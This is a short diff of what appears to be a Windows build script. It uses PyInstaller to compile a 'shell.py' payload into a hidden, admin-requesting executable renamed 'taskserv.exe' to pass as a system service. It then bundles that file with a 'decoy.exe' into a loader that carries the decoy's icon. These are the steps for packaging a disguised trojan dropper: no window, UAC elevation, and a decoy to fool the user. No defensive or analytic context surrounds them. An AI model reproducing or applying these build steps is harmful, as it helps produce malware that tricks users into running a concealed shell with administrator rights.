@@ -1,4 +1,3 @@
-icon-extract.exe decoy.exe icon.ico
 pyinstaller.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\shell.py
 copy dist\shell.exe .\taskserv.exe
 pyinstaller.exe --add-binary="taskserv.exe;." --add-binary="decoy.exe;." --icon=decoy.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\loader.py
